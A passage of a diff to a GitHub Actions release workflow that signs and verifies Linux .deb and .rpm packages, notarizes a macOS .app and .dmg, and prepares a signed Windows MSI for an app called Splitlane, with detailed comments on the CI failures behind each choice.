+          # as the `.rpmmacros` file itself.
+          PASS_FILE=$(mktemp)
+          chmod 600 "$PASS_FILE"
+          trap 'rm -f "$PASS_FILE" "$HOME/.rpmmacros"' EXIT
+          printf '%s' "${GPG_PASSPHRASE:-}" > "$PASS_FILE"
+
+          # Override `%__gpg` directly (NOT `%_gpgbin`). On Ubuntu 22.04
+          # the default `/usr/lib/rpm/macros` sets `%__gpg` to
+          # `/usr/bin/gpg2` - a Fedora-ism that does not exist on
+          # Debian-family systems, where GnuPG 2.2+ ships as the
+          # unified `/usr/bin/gpg` binary. Setting only `%_gpgbin` is
+          # NOT enough (rpm ignores it during macro expansion of
+          # `%{__gpg}`); `%__gpg` is the authoritative knob.
+          #
+          # `%__gpg_sign_cmd` then references `%{__gpg}` which now
+          # resolves to our Ubuntu-safe path. Verified empirically via
+          # strace against `rpmsign --addsign`: without this override,
+          # rpmsign execve's `/usr/bin/gpg2` → ENOENT → "Could not
+          # exec gpg".
+          cat > "$HOME/.rpmmacros" <<RPMMACROS
+          %_signature gpg
+          %_gpg_name  $GPG_KEY_ID
+          %__gpg      /usr/bin/gpg
+          %__gpg_sign_cmd %{__gpg} --batch --yes \
+              --pinentry-mode loopback \
+              --passphrase-file $PASS_FILE \
+              --no-verbose \
+              --no-armor \
+              --no-secmem-warning \
+              -u "%{_gpg_name}" \
+              -sbo %{__signature_filename} \
+              %{__plaintext_filename}
+          RPMMACROS
+
+          # --- Sign all .deb files -------------------------------------
+          # `dpkg-sig --sign builder` embeds a detached GPG clearsign in
+          # the .deb's control section. The `builder` role string is
+          # conventional for CI-built packages.
+          #
+          # Glob note: cargo-deb emits `_amd64.deb` on x86_64 and
+          # `_arm64.deb` on aarch64. The `target/${TARGET}/debian/`
+          # prefix already scopes the glob to the current matrix leg, so
+          # the wildcard `splitlane_*.deb` is unambiguous per-leg.
+          for deb in target/"${TARGET}"/debian/splitlane_*.deb; do
+            [ -f "$deb" ] || continue
+            echo "→ dpkg-sig --sign builder $deb"
+            dpkg-sig -k "$GPG_KEY_ID" --sign builder "$deb"
+          done
+
+          # --- Sign all .rpm files -------------------------------------
+          # `rpmsign --addsign` embeds the signature in the RPM header
+          # using the macros above. No per-invocation flags - everything
+          # is controlled by ~/.rpmmacros.
+          #
+          # Glob note: cargo-generate-rpm emits `.x86_64.rpm` and
+          # `.aarch64.rpm`. Same target-scoped-directory reasoning as the
+          # .deb loop above.
+          #
+          # v0.2.1 re-enable: prior v0.2.0 failure signature was
+          # "/dev/stdin: import read failed(0)". Root cause was bundled
+          # with the rpm-pubkey-import path (fixed separately in commit
+          # 92729d0 via tempfile); the rpmsign path depends on a warmed
+          # gpg-agent (see Pre-warm step above) plus the Ubuntu-specific
+          # `%__gpg` override. If CI regresses on a future release,
+          # fallbacks ranked: (a) rpmsign with inline `--define` flags
+          # (sidesteps ~/.rpmmacros entirely), (b) revert to the echo-only
+          # placeholder and ship unsigned for a single hotfix release.
+          for rpm in target/"${TARGET}"/generate-rpm/splitlane-*.rpm; do
+            [ -f "$rpm" ] || continue
+            echo "→ rpmsign --addsign $rpm"
+            rpmsign --addsign "$rpm"
+          done
+
+          # --- Verify (hard assert; a failed verify aborts the run) ----
+          # Strategy: rely on the tool's exit code as the authoritative
+          # pass/fail signal. Both `dpkg-sig --verify` and `rpm
+          # --checksig` exit 0 iff every signature component is OK, and
+          # non-zero otherwise. Verbose output is tee'd to a log for CI
+          # debugging but is NOT grepped - the output format varies
+          # across versions (modern rpm ≥4.17 emits "Header V4 RSA/SHA256
+          # Signature, key ID ...: OK" while older rpm emits "pgp md5
+          # OK"; dpkg-sig keeps GOODSIG stable but why couple to strings
+          # when the exit code is canonical?).
+          #
+          # Import the public half of our own key into an RPM DB so
+          # `rpm --checksig` can verify. Use a USER-SCOPED DB via
+          # `--dbpath` instead of the system DB at `/var/lib/rpm`:
+          #
+          # 1. No sudo needed - avoids the `sudo rpm --import /dev/stdin`
+          #    subprocess-stdin-reopen bug (rpm#3740) AND avoids any
+          #    silent-failure on Ubuntu's `rpm` package, which ships
+          #    without an initialized `/var/lib/rpm/Packages` db (v0.2.1
+          #    retry #1 surface: rpmsign signed OK, dpkg-sig verified OK,
+          #    but `rpm --checksig` returned NOKEY for key ID 183f2711
+          #    despite `sudo rpm --import` running to silent-success).
+          # 2. Fully isolated - cleaned up by the trap at EXIT along with
+          #    PASS_FILE and PUBKEY_FILE. No state leaks into the runner.
+          # 3. Cross-distro portable - the same `--dbpath "$RPM_DB"`
+          #    arguments work on Fedora / RHEL / openSUSE runners too if
+          #    we ever add them to the matrix.
+          PUBKEY_FILE=$(mktemp --suffix=.asc)
+          chmod 600 "$PUBKEY_FILE"
+          RPM_DB=$(mktemp -d)
+          trap 'rm -f "$PASS_FILE" "$HOME/.rpmmacros" "$PUBKEY_FILE"; rm -rf "$RPM_DB"' EXIT
+          gpg --armor --export "$GPG_KEY_ID" > "$PUBKEY_FILE"
+          rpm --dbpath "$RPM_DB" --initdb
+          rpm --dbpath "$RPM_DB" --import "$PUBKEY_FILE"
+          # Sanity-check the import actually landed - failure mode on
+          # rpm 4.17 is silent (exit 0 + empty keyring). The signing key
+          # fingerprint's last 8 hex chars lowercased are what rpm uses
+          # for the gpg-pubkey-<keyid>-<creation> package name.
+          KEY_SHORT=$(echo "$GPG_KEY_ID" | tail -c9 | tr 'A-F' 'a-f')
+          # rpm -qa with a pattern matches the NAME column only. gpg-pubkey
+          # packages all share the name "gpg-pubkey" - the key-id lives in
+          # the Version-Release ("gpg-pubkey-<keyid>-<creation>"). So the
+          # pattern `"gpg-pubkey-${KEY_SHORT}*"` matches NOTHING even when
+          # the key is present (v0.2.1 retry #2 surface: keyring dump
+          # confirmed "gpg-pubkey-183f2711-69e67caa" was imported, but the
+          # pattern-match check failed). Grep the full `rpm -qa 'gpg-pubkey*'`
+          # listing for the short key-id substring instead.
+          if ! rpm --dbpath "$RPM_DB" -qa 'gpg-pubkey*' | grep -qi "${KEY_SHORT}"; then
+            echo "::error::Public key ${KEY_SHORT} not imported into rpm DB at ${RPM_DB}. Dumping keyring for diagnostics:"
+            rpm --dbpath "$RPM_DB" -qa 'gpg-pubkey*' >&2 || true
+            exit 1
+          fi
+          echo "→ Imported gpg-pubkey-${KEY_SHORT} into isolated rpm DB at ${RPM_DB}"
+          # `${PIPESTATUS[0]}` reads the exit code of the FIRST command
+          # in a bash pipeline, independent of `tee`'s exit code. Using
+          # `set -o pipefail` wouldn't work here because `tee` always
+          # exits 0 on successful writes - we need the verify tool's
+          # own status, not the pipeline's composite status.
+          for deb in target/"${TARGET}"/debian/splitlane_*.deb; do
+            [ -f "$deb" ] || continue
+            echo "→ dpkg-sig --verify $deb"
+            dpkg-sig --verify "$deb" | tee /tmp/dpkg-sig-verify.log
+            if [ "${PIPESTATUS[0]}" -ne 0 ]; then
+              echo "::error::dpkg-sig --verify failed on $deb"
+              exit 1
+            fi
+          done
+          # v0.2.1: verify every signed .rpm with
+          # `rpm --checksig -v`. Exits 0 iff every signature component is
+          # OK (Header V4 RSA/SHA256, Header SHA1, Payload, MD5). Any
+          # NOKEY/BAD bubbles up as non-zero and fails the release - no
+          # silent-unsigned-rpm path. `PIPESTATUS[0]` reads rpm's own
+          # status, independent of `tee`'s always-0 exit.
+          for rpm_path in target/"${TARGET}"/generate-rpm/splitlane-*.rpm; do
+            [ -f "$rpm_path" ] || continue
+            echo "→ rpm --dbpath $RPM_DB --checksig -v $rpm_path"
+            rpm --dbpath "$RPM_DB" --checksig -v "$rpm_path" | tee /tmp/rpm-checksig-verify.log
+            if [ "${PIPESTATUS[0]}" -ne 0 ]; then
+              echo "::error::rpm --checksig failed on $rpm_path (NOKEY or BAD signature)"
+              exit 1
+            fi
+          done
+
+      - name: Produce AppImage
+        if: runner.os == 'Linux'
+        # `TAG` routed via `env:` rather than inlining `${{ github.ref_name }}`
+        # in the shell body - same injection-hardening rationale as the
+        # staging step below (attacker-controlled tags must not reach bash
+        # via expression substitution).
+        env:
+          TARGET: ${{ matrix.target }}
+          ARCH: ${{ matrix.arch }}
+          TAG: ${{ env.RELEASE_TAG }}
+        # `${TAG#v}` strips the leading `v`. See the bundle-tarball
+        # invocation above for the rationale (consistency with macOS/
+        # Windows naming + safe under suffix-only update matcher).
+        run: bash scripts/bundle-appimage.sh "${TAG#v}"
+
+      # ─── macOS .app assembly ─────────────────────────────────────────
+      # Mirrors the run_tests.yml Xcode preflight (kept intentionally duplicated
+      # - a drift here, e.g. an old runner image missing the Metal
+      # toolchain, surfaces as a labelled preflight failure rather than a
+      # cryptic mid-compile error).
+      - name: Verify Xcode CLT + Metal toolchain (macOS)
+        if: runner.os == 'macOS'
+        run: |
+          set -euo pipefail
+
+          CLT_PATH="$(xcode-select -p 2>/dev/null || true)"
+          if [ -z "$CLT_PATH" ] || [ ! -d "$CLT_PATH" ]; then
+            echo "::error::Xcode Command Line Tools not found (xcode-select -p returned '$CLT_PATH')."
+            exit 1
+          fi
+
+          SDK_PATH="$(xcrun --show-sdk-path 2>/dev/null || true)"
+          if [ -z "$SDK_PATH" ] || [ ! -d "$SDK_PATH" ]; then
+            echo "::error::macOS SDK not found (xcrun --show-sdk-path returned '$SDK_PATH')."
+            exit 1
+          fi
+
+          if ! xcrun --find metal >/dev/null 2>&1; then
+            echo "::error::Metal compiler not available - gpui_macos compiles .metal shaders and will fail without it."
+            exit 1
+          fi
+
+          METAL_HEADERS="$SDK_PATH/System/Library/Frameworks/Metal.framework/Headers"
+          if [ ! -d "$METAL_HEADERS" ]; then
+            echo "::error::Metal framework headers not found at $METAL_HEADERS."
+            exit 1
+          fi
+          echo "Xcode CLT: $CLT_PATH | SDK: $SDK_PATH | Metal: $(xcrun --find metal)"
+
+      # Assemble the .app bundle from the release binary cargo just built
+      # (the preceding "Build release binary" step ran for every leg
+      # including macOS, so target/<triple>/release/splitlane exists).
+      # `--version "${TAG#v}"` strips the leading 'v': Apple's
+      # CFBundleShortVersionString (stamped into Info.plist) must be
+      # bare semver. The .dmg filename the updater matches on is also
+      # v-stripped (splitlane-0.2.0-aarch64-apple-darwin.dmg).
+      - name: Produce .app bundle
+        if: runner.os == 'macOS'
+        env:
+          ARCH: ${{ matrix.arch }}
+          TAG: ${{ env.RELEASE_TAG }}
+        run: |
+          set -euo pipefail
+          version="${TAG#v}"
+          bash scripts/bundle-macos.sh --version "$version" --arch "$ARCH"
+
+      # ─── macOS codesign + notarize ───────────────────────────────────
+      # The `if: runner.os == 'macOS'` guard skips these steps silently on
+      # every Linux / Windows leg.
+      #
+      # Secrets used (must be populated in repo settings before the first
+      # signed macOS release can ship):
+      #   APPLE_DEVELOPER_CERT_P12        - base64-encoded .p12
+      #   APPLE_DEVELOPER_CERT_PASSWORD   - password to decrypt the .p12
+      #   APPLE_ID                        - Apple Developer account email
+      #   APPLE_APP_SPECIFIC_PASSWORD     - app-specific password (not the
+      #                                     Apple ID password itself)
+      #   APPLE_TEAM_ID                   - 10-char team ID
+      #
+      # Dry-runs can degrade to an unsigned build when Apple
+      # secrets are missing. Tag-push releases fail hard instead, because
+      # shipping a public macOS artifact without signing and notarization
+      # breaks the release contract. The "Detect macOS signing secrets"
+      # step exposes a boolean output consumed by the sign + notarize
+      # step guards below.
+      #
+      # The `.app` input comes from `scripts/bundle-macos.sh`, run earlier
+      # in this leg. Sign → notarize → staple is the mandatory order:
+      # codesign attaches a signature with the release entitlements,
+      # notarytool validates + registers it with Apple, stapler glues the
+      # ticket to the bundle so Gatekeeper accepts it offline.
+      - name: Detect macOS signing secrets
+        id: macos_signing
+        if: runner.os == 'macOS'
+        env:
+          # Secrets are routed through env: so an empty secret resolves
+          # to an empty env var (rather than the literal string
+          # `${{ secrets.NAME }}` which would always look "present").
+          APPLE_DEVELOPER_CERT_P12: ${{ secrets.APPLE_DEVELOPER_CERT_P12 }}
+          APPLE_DEVELOPER_CERT_PASSWORD: ${{ secrets.APPLE_DEVELOPER_CERT_PASSWORD }}
+          APPLE_ID: ${{ secrets.APPLE_ID }}
+          APPLE_APP_SPECIFIC_PASSWORD: ${{ secrets.APPLE_APP_SPECIFIC_PASSWORD }}
+          APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}
+        run: |
+          set -euo pipefail
+          if [ -n "${APPLE_DEVELOPER_CERT_P12:-}" ] \
+             && [ -n "${APPLE_DEVELOPER_CERT_PASSWORD:-}" ] \
+             && [ -n "${APPLE_ID:-}" ] \
+             && [ -n "${APPLE_APP_SPECIFIC_PASSWORD:-}" ] \
+             && [ -n "${APPLE_TEAM_ID:-}" ]; then
+              echo "All 5 Apple signing secrets are present - will sign + notarize."
+              echo "signing_available=true" >> "$GITHUB_OUTPUT"
+          else
+              if [ "${RELEASE_MODE}" = "release" ]; then
+                  echo "::error title=macOS signing required::One or more APPLE_* secrets are missing. Tag-push releases must sign and notarize the macOS artifact."
+                  exit 1
+              fi
+              echo "::warning title=macOS signing skipped::One or more APPLE_* secrets are missing - emitting an UNSIGNED .app."
+              echo "signing_available=false" >> "$GITHUB_OUTPUT"
+          fi
+
+      - name: Sign macOS .app bundle
+        if: runner.os == 'macOS' && steps.macos_signing.outputs.signing_available == 'true'
+        env:
+          APPLE_DEVELOPER_CERT_P12: ${{ secrets.APPLE_DEVELOPER_CERT_P12 }}
+          APPLE_DEVELOPER_CERT_PASSWORD: ${{ secrets.APPLE_DEVELOPER_CERT_PASSWORD }}
+          APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}
+        # No --entitlements override: sign-macos.sh defaults to
+        # packaging/macos/splitlane.entitlements via REPO_ROOT-relative
+        # absolute path, which is more robust than this step's working
+        # directory assumption.
+        run: bash scripts/sign-macos.sh dist/Splitlane.app
+
+      - name: Notarize + staple macOS .app bundle
+        if: runner.os == 'macOS' && steps.macos_signing.outputs.signing_available == 'true'
+        # In dry-run mode a transient Apple Notary outage
+        # must not fail the entire leg - the release engineer still
+        # wants the un-notarized .app + the Linux/Windows artifacts to
+        # land in the workflow artifact bundle for inspection. In
+        # tag-push mode this stays hard-required: shipping an
+        # un-notarized .dmg under v0.X.Y would block first-launch on
+        # every macOS user's box.
+        continue-on-error: ${{ env.RELEASE_MODE == 'dry-run' }}
+        env:
+          APPLE_ID: ${{ secrets.APPLE_ID }}
+          APPLE_APP_SPECIFIC_PASSWORD: ${{ secrets.APPLE_APP_SPECIFIC_PASSWORD }}
+          APPLE_TEAM_ID: ${{ secrets.APPLE_TEAM_ID }}
+        run: bash scripts/notarize-macos.sh dist/Splitlane.app
+
+      - name: Record unsigned macOS build in job summary
+        if: runner.os == 'macOS' && steps.macos_signing.outputs.signing_available != 'true'
+        env:
+          ARCH: ${{ matrix.arch }}
+          TAG: ${{ env.RELEASE_TAG }}
+        run: |
+          set -euo pipefail
+          {
+              echo "## ⚠️ Unsigned macOS build (${ARCH}, ${TAG})"
+              echo
+              echo "One or more APPLE_* secrets were missing, so this leg shipped an"
+              echo "**unsigned, un-notarized** \`Splitlane.app\`. macOS Gatekeeper will"
+              echo "block first-launch with the \"can't be opened\" prompt."
+              echo
+              echo "Required secrets: \`APPLE_DEVELOPER_CERT_P12\`, "
+              echo "\`APPLE_DEVELOPER_CERT_PASSWORD\`, \`APPLE_ID\`,"
+              echo "\`APPLE_APP_SPECIFIC_PASSWORD\`, \`APPLE_TEAM_ID\`."
+          } >> "$GITHUB_STEP_SUMMARY"
+
+      # ─── Free disk space before .dmg ─────────────────────────────────
+      # macos-14 hosted runners ship with ~14 GB free. A workspace-wide
+      # `cargo build --release` for the GPUI graph routinely consumes
+      # 11-13 GB of `target/` (Zed monorepo deps, alacritty_terminal,
+      # gpui_macos with Metal shaders, all release-mode codegen). By the
+      # time we reach `Produce .dmg`, the runner has <100 MB free, and
+      # `hdiutil create` aborts with `No space left on device` while
+      # asking for a 75 MB staging image (observed in v0.2.9-rc.1).
+      #
+      # `target/` is disposable here: the release binary was already
+      # copied into `dist/Splitlane.app/Contents/MacOS/splitlane` by
+      # `bundle-macos.sh`, signed by `sign-macos.sh`, and stapled by
+      # `notarize-macos.sh`. Nothing downstream in this leg reads
+      # `target/`. `df -h` brackets give us the disk delta in the CI log
+      # for future capacity-planning. Linux/Windows legs skip via the
+      # `runner.os == 'macOS'` guard.
+      - name: Free disk space before .dmg packaging
+        if: runner.os == 'macOS'
+        run: |
+          set -euo pipefail
+          echo "::group::Disk space before cleanup"
+          df -h /
+          du -sh target/ 2>/dev/null || true
+          echo "::endgroup::"
+          rm -rf target/
+          echo "::group::Disk space after cleanup"
+          df -h /
+          echo "::endgroup::"
+
+      # ─── .dmg assembly ───────────────────────────────────────────────
+      # Wraps the stapled .app in a drag-to-Applications .dmg. Zero new
+      # dependencies - hdiutil + osascript are built into macOS. Runs
+      # *after* notarization so the enclosed bundle already carries its
+      # Apple-issued stapled ticket.
+      #
+      # Publish-safety guard: `.dmg` production and staging
+      # are gated on `steps.macos_signing.outputs.signing_available`. An
+      # unsigned `.app` MUST NOT reach the published GitHub Release -
+      # users would hit Gatekeeper "can't be opened" with no in-band
+      # signal that the asset was published unsigned. When secrets are
+      # absent the leg leaves the unsigned `.app` in `dist/` for local
+      # inspection, prints the warning banner from the previous step, and
+      # produces no release asset.
+      #
+      # The output filename `splitlane-<tag>-<arch>-apple-darwin.dmg` is
+      # chosen to match `update_checker.rs::pick_asset`; any
+      # other shape would silently break the in-app update prompt for
+      # macOS users.
+      - name: Produce .dmg
+        if: runner.os == 'macOS' && steps.macos_signing.outputs.signing_available == 'true'
+        env:
+          TAG: ${{ env.RELEASE_TAG }}
+          ARCH: ${{ matrix.arch }}
+        run: |
+          set -euo pipefail
+          version="${TAG#v}"
+          bash scripts/create-dmg.sh --version "$version" --arch "$ARCH"
+
+      # Stage the .dmg + SHA-256 sibling into release-assets/ so the
+      # downstream `release` job picks it up alongside the Linux-leg
+      # artifacts. Mirrors the sha256 pattern used by the tar.gz step.
+      # Linux legs skip this entirely; the macos-14 matrix
+      # leg activates it. Gated on signing_available so
+      # unsigned legs produce no release asset.
+      - name: Stage macOS .dmg
+        if: runner.os == 'macOS' && steps.macos_signing.outputs.signing_available == 'true'
+        env:
+          TAG: ${{ env.RELEASE_TAG }}
+          ARCH: ${{ matrix.arch }}
+        run: |
+          set -euo pipefail
+          mkdir -p release-assets
+          # Filenames drop the leading `v` to match the updater's
+          # documented convention (splitlane-<semver>-<arch>-apple-darwin.dmg).
+          version="${TAG#v}"
+          dmg="splitlane-${version}-${ARCH}-apple-darwin.dmg"
+          cp "dist/${dmg}" "release-assets/${dmg}"
+          ( cd release-assets && shasum -a 256 "${dmg}" > "${dmg}.sha256" )
+          ls -la release-assets/
+
+      # ─── Windows MSI/signing gate (early) ────────────────────────────────
+      # Detect whether the 6 Azure Trusted Signing secrets are populated
+      # BEFORE any MSI/packaging step runs. When any are missing, every
+      # subsequent Windows-only packaging step (Preflight WiX, Install
+      # cargo-wix, Produce MSI, Sign, Verify, Stage) is skipped - only
+      # the cargo fmt / clippy / test / Build release binary validation
+      # remains, which preserves cross-platform compile coverage without
+      # noisy red failures from cargo-wix or unsigned-MSI artifacts.
+      #
+      # Routing: secrets go through env: so an unset secret resolves to
+      # an empty string (not the literal `${{ secrets.NAME }}` placeholder
+      # which would always look "present"). The 6 names match what
+      # `scripts/sign-windows.ps1` reads at runtime.
+      - name: Detect Windows signing secrets
+        id: windows_signing
+        if: runner.os == 'Windows'
+        shell: bash
+        env:
+          AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
+          AZURE_CLIENT_ID: ${{ secrets.AZURE_CLIENT_ID }}
+          AZURE_CLIENT_SECRET: ${{ secrets.AZURE_CLIENT_SECRET }}
+          AZURE_TRUSTED_SIGNING_ENDPOINT: ${{ secrets.AZURE_TRUSTED_SIGNING_ENDPOINT }}
+          AZURE_TRUSTED_SIGNING_ACCOUNT: ${{ secrets.AZURE_TRUSTED_SIGNING_ACCOUNT }}
+          AZURE_TRUSTED_SIGNING_CERT_PROFILE: ${{ secrets.AZURE_TRUSTED_SIGNING_CERT_PROFILE }}
+          # The O= (Organization) the signature must carry. A repository
+          # VARIABLE, not a secret - it is printed in the log on failure and
+          # is the publisher name users see, so it is not confidential. The
+          # script HARD-FAILS if it is empty rather than skipping the check.
+          SPLITLANE_EXPECTED_SIGNER_ORG: ${{ vars.SPLITLANE_EXPECTED_SIGNER_ORG }}
+        run: |
+          set -euo pipefail
+          if [ -n "${AZURE_TENANT_ID:-}" ] \
+             && [ -n "${AZURE_CLIENT_ID:-}" ] \
+             && [ -n "${AZURE_CLIENT_SECRET:-}" ] \
+             && [ -n "${AZURE_TRUSTED_SIGNING_ENDPOINT:-}" ] \
+             && [ -n "${AZURE_TRUSTED_SIGNING_ACCOUNT:-}" ] \
+             && [ -n "${AZURE_TRUSTED_SIGNING_CERT_PROFILE:-}" ] \
+             && [ -n "${SPLITLANE_EXPECTED_SIGNER_ORG:-}" ]; then
+              echo "All 6 Azure Trusted Signing secrets plus the expected signer org are present - will sign the EXE, then produce + sign + verify MSI."
+              echo "signing_available=true" >> "$GITHUB_OUTPUT"
+          else
+              echo "::warning title=Windows MSI packaging skipped::One or more AZURE_* secrets, or the SPLITLANE_EXPECTED_SIGNER_ORG variable, are missing - skipping Preflight WiX / Install cargo-wix / Produce MSI / Sign / Verify / Stage. Build/test/clippy still run for cross-platform validation."
+              echo "signing_available=false" >> "$GITHUB_OUTPUT"
+          fi
+
+      # ─── Windows MSI: toolchain preflight ────────────────────────────────
+      # Gated on `windows_signing.signing_available` (set above): when the
+      # Azure secrets aren't populated yet, we don't bother with WiX or
+      # cargo-wix at all - the build/test/clippy validation above is what
+      # we need for cross-platform coverage. Once the secrets land, this
+      # whole chain re-activates without any other workflow change.
+      #
+      # windows-2022 preinstalls WiX 3.14.1.8722. signtool.exe lives in
+      # the Windows 10/11 SDK but is NOT resolved here: sign-windows.ps1
+      # does its own SDK scan (defense in depth - if the runner image
+      # ever drops it, the script's clear error is better than a silent
+      # PATH mismatch between this step and the script). Preflight only
+      # handles WiX because cargo-wix errors are cryptic otherwise.
+      - name: Preflight WiX v3 toolchain
+        if: runner.os == 'Windows' && steps.windows_signing.outputs.signing_available == 'true'
+        shell: pwsh
+        run: |
+          # cargo-wix 0.3.9 needs candle.exe + light.exe. Preinstalled
+          # on windows-2022 at C:\Program Files (x86)\WiX Toolset v3.14\bin\.
+          # v3.11 retained as a defensive fallback - if the image ever
+          # rolls back, emit a Write-Warning so the drift is visible in
+          # the CI log rather than silently selecting an older toolset
+          # that may emit subtly different MSIs.
+          $wixRoots = @(
+              'C:\Program Files (x86)\WiX Toolset v3.14\bin',
+              'C:\Program Files (x86)\WiX Toolset v3.11\bin'
+          )
+          $wixBin = $wixRoots | Where-Object { Test-Path $_ } | Select-Object -First 1
+          if (-not $wixBin) {
+              throw "WiX v3 not found under any known path. cargo-wix 0.3.9 requires WiX v3 (candle.exe/light.exe). Runner image may have dropped the preinstalled toolset - add an explicit install step (choco install wixtoolset --version 3.14.1)."
+          }
+          if ($wixBin -match 'v3\.11') {
+              Write-Warning "Falling back to WiX v3.11 - windows-2022 image normally ships v3.14. Verify runner-image changelog for a silent WiX downgrade."
+          }
+          Write-Output "Using WiX: $wixBin"
+          Add-Content -Path $env:GITHUB_PATH -Value $wixBin
+
+      # cargo-wix itself is NOT preinstalled on windows-2022. Pinned to
+      # 0.3.9 (latest 2025-03 release; no 0.4.x exists yet that supports
+      # WiX v4 - tracked upstream as volks73/cargo-wix#202). The
+      # Swatinem/rust-cache step above caches `~/.cargo/bin`, so this is
+      # ~2 min cold / ~10 s cached.
+      - name: Install cargo-wix (pinned)
+        if: runner.os == 'Windows' && steps.windows_signing.outputs.signing_available == 'true'
+        shell: pwsh
+        run: |
+          cargo install cargo-wix --version 0.3.9 --locked
+          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
+
+      - name: Validate WiX per-machine invariants
+        if: runner.os == 'Windows' && steps.windows_signing.outputs.signing_available == 'true'
+        shell: pwsh
+        run: |
+          $ns = New-Object System.Xml.XmlNamespaceManager((New-Object System.Xml.NameTable))
+          $ns.AddNamespace('w', 'http://schemas.microsoft.com/wix/2006/wi')
+          $xml = New-Object System.Xml.XmlDocument
+          $xml.Load((Resolve-Path -LiteralPath 'packaging/wix/main.wxs').Path)
+          $package = $xml.SelectSingleNode('//w:Package', $ns)
+          if ($null -eq $package) {
+              throw "WiX Package element not found."
+          }
+          if ($package.GetAttribute('InstallScope') -eq 'perMachine') {
+              $hkcuKeyPaths = @($xml.SelectNodes("//w:Component[.//w:RegistryValue[@Root='HKCU' and @KeyPath='yes']]", $ns))
+              $invalid = @($hkcuKeyPaths | Where-Object {
+                  $hasShortcut = $_.SelectNodes(".//w:Shortcut", $ns).Count -gt 0
+                  $hasMachineFile = $_.SelectNodes(".//w:File", $ns).Count -gt 0
+                  $hasMachineEnvironment = $_.SelectNodes(".//w:Environment", $ns).Count -gt 0
+                  $hasMachineRegistry = $_.SelectNodes(".//w:RegistryValue[@Root='HKLM']", $ns).Count -gt 0
+                  -not ($hasShortcut -and -not ($hasMachineFile -or $hasMachineEnvironment -or $hasMachineRegistry))
+              })
+              if ($invalid.Count -gt 0) {
+                  $ids = @($invalid | ForEach-Object { $_.Id }) -join ', '
+                  throw "perMachine MSI may use HKCU KeyPath only for shortcut-only components. Offending component(s): $ids"
+              }
+          }
+
+      # ─── Windows Authenticode: sign the installed executable first ───────
+      # Smart App Control evaluates the installed application binary, not just
+      # the container MSI. WiX embeds this exact release binary, so sign it
+      # before `cargo wix --no-build` packages it into Program Files.
+      - name: Sign Windows executable
+        id: sign_windows_exe
+        if: runner.os == 'Windows' && steps.windows_signing.outputs.signing_available == 'true'
+        shell: pwsh
+        env:
+          AZURE_TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
+          AZURE_CLIENT_ID: ${{ secrets.AZURE_CLIENT_ID }}
+          AZURE_CLIENT_SECRET: ${{ secrets.AZURE_CLIENT_SECRET }}
+          AZURE_TRUSTED_SIGNING_ENDPOINT: ${{ secrets.AZURE_TRUSTED_SIGNING_ENDPOINT }}
+          AZURE_TRUSTED_SIGNING_ACCOUNT: ${{ secrets.AZURE_TRUSTED_SIGNING_ACCOUNT }}
+          AZURE_TRUSTED_SIGNING_CERT_PROFILE: ${{ secrets.AZURE_TRUSTED_SIGNING_CERT_PROFILE }}
+          # The O= (Organization) the signature must carry. A repository
+          # VARIABLE, not a secret - it is printed in the log on failure and
+          # is the publisher name users see, so it is not confidential. The
+          # script HARD-FAILS if it is empty rather than skipping the check.
+          SPLITLANE_EXPECTED_SIGNER_ORG: ${{ vars.SPLITLANE_EXPECTED_SIGNER_ORG }}
+        run: |
+          $exe = 'target\x86_64-pc-windows-msvc\release\splitlane.exe'
+          if (-not (Test-Path -LiteralPath $exe -PathType Leaf)) {
+              throw "No Windows release executable found at $exe. The Build release binary step may have failed or emitted an unexpected path."
+          }
+          pwsh -NoProfile -File ./scripts/sign-windows.ps1 -InputFile $exe
+
+      - name: Verify Windows libghostty release payload
+        if: runner.os == 'Windows' && steps.windows_signing.outputs.signing_available == 'true'
+        shell: pwsh
+        env:
+          TARGET: ${{ matrix.target }}
+        run: |
+          $report = 'target\libghostty-windows-release\provenance.json'
+          $exe = "target\$env:TARGET\release\splitlane.exe"
+          pwsh -NoProfile -File ./scripts/verify-libghostty-windows.ps1 `
+            -Target $env:TARGET `
+            -Binary $exe `
+            -ReportPath $report `
+            -AllowGeneratedIcons
+          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
+
+          $provenance = Get-Content -LiteralPath $report -Raw | ConvertFrom-Json
+          if ($provenance.linkage -ne 'static-candidate' -or
+              $provenance.runtime_smoke_verified -ne $false -or
+              [string]::IsNullOrWhiteSpace($provenance.binary_sha256)) {
+              throw 'libghostty release provenance did not produce the expected pre-smoke static candidate'
+          }
+          $serialized = Get-Content -LiteralPath $report -Raw
+          if ($serialized -match '(?i)[a-z]:\\') {
+              throw 'libghostty release provenance must not contain runner-local absolute paths'
+          }
+
+      # ─── Produce MSI ─────────────────────────────────────────────────────
+      # cargo-wix reads [package.metadata.wix] in src-app/Cargo.toml
+      # and `packaging/wix/main.wxs` to drive candle → light. The
+      # `--install-version` flag overrides the MSI's ProductVersion with
+      # the bare semver (no leading `v`) - required because WiX's
+      # ProductVersion schema rejects `v0.1.7` and accepts only `0.1.7`.
+      #
+      # Output: `target/wix/splitlane-<ver>-x86_64.msi`. The `--target`
+      # flag tells cargo-wix which already-signed release binary to pick up
+      # (`target/x86_64-pc-windows-msvc/release/splitlane.exe`) but the
+      # installer output directory is always `target/wix/` regardless -
+      # do NOT assume the triple folder.
+      - name: Produce MSI
+        if: runner.os == 'Windows' && steps.windows_signing.outputs.signing_available == 'true'
+        shell: pwsh
+        env:
+          MSI_VERSION: ${{ env.WINDOWS_MSI_VERSION }}
+        run: |
+          $version = $env:MSI_VERSION -replace '^v', ''
+          if ($version -notmatch '^\d+\.\d+\.\d+(?:-[0-9A-Za-z]+(?:[.-][0-9A-Za-z]+)*)?(?:\+[0-9A-Za-z]+(?:[.-][0-9A-Za-z]+)*)?$') {
+              throw "Windows MSI ProductVersion must be valid semver, got '$version'"
+          }
+          # --no-build: the "Build release binary" step above already
+          # produced target/x86_64-pc-windows-msvc/release/splitlane.exe.
+          # Without this flag cargo-wix 0.3.9 internally re-runs
+          # `cargo build --release`, duplicating ~3-5 min of compile on
+          # a cold runner. Matches the macOS pattern where
+          # bundle-macos.sh consumes a pre-built binary.
+          #
+          # cargo-wix has NO `build` subcommand: `cargo wix` (the default) IS
+          # the create-MSI action. Writing `cargo wix build` makes clap treat
